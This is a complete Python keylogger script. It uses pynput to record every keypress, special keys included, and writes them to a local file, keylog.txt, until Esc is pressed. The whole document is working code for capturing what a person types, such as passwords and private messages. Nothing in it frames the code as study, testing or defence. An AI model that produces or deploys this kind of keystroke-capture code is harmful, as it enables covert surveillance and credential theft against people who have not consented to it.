import pynput.keyboard

#### Global variable to store pressed keys
logged_keys = []

def on_press(key):
    try:
        ### Convert the key to a string and append to the list
        logged_keys.append(key.char)
    except AttributeError:
        ### If a special key (e.g., shift, ctrl, etc.) is pressed, log it as it is
        logged_keys.append(str(key))

def write_to_file(keys):
    # Open the log file in append mode
    with open("keylog.txt", "a") as f:
        for key in keys:
            # If Enter key is pressed, start a new line
            if key == 'Key.enter':
                f.write('\n')
            # If Backspace key is pressed, remove the last character from the log
            elif key == 'Key.backspace':
                f.seek(0, 2)  # Move the cursor to the end of the file
                f.seek(f.tell() - 1, 0)  # Move the cursor back by 1 character
                f.truncate()  # Delete the last character
            else:
                f.write(key)
                f.write(' ')

def on_release(key):
    if key == pynput.keyboard.Key.esc:
        # If Esc key is pressed, stop the listener
        return False

# Start listening for key events
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    # Continuously write logged keys to the file
    while True:
        if len(logged_keys) > 0:
            write_to_file(logged_keys)
            logged_keys = []  # Clear the logged keys
